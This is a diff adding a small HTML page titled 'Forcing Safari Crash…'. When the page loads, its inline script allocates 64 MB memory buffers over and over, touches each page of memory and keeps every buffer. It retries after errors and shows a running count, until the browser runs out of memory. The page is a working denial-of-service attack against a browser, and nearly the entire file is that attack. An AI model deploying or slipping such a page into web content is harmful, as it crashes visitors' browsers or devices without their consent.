@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: sans-serif;
+      background: #f8f8f8;
+      color: #333;
+    }
+    #counter {
+      margin-top: 1rem;
+      font-size: 1.2rem;
+    }
+  </style>
+</head>
+<body>
+  <h1>Forcing Safari Crash…</h1>
+  <p id="counter">Allocated: 0 MB</p>
+
+  <script>
+    (function forcedCrash(){
+      const allocations = [];
+      const CHUNK_MB = 64;               
+      const PAGE_SIZE = 4 * 1024;    
+      let totalMB = 0;
+
+      function step() {
+        try {
+          const buf = new ArrayBuffer(CHUNK_MB * 1024 * 1024);
+          const view = new Uint8Array(buf);
+
+          for (let i = 0; i < view.length; i += PAGE_SIZE) {
+            view[i] = 1;
+          }
+
+          allocations.push(buf);
+          totalMB += CHUNK_MB;
+          document.getElementById('counter').textContent =
+            `Allocated: ${totalMB.toLocaleString()} MB`;
+
+          window.requestAnimationFrame(step);
+
+        } catch (e) {
+          console.warn('Buffer allocation error:', e);
+          window.requestAnimationFrame(step);
+        }
+      }
+
+      step();
+    })();
+  </script>
+</body>
+</html
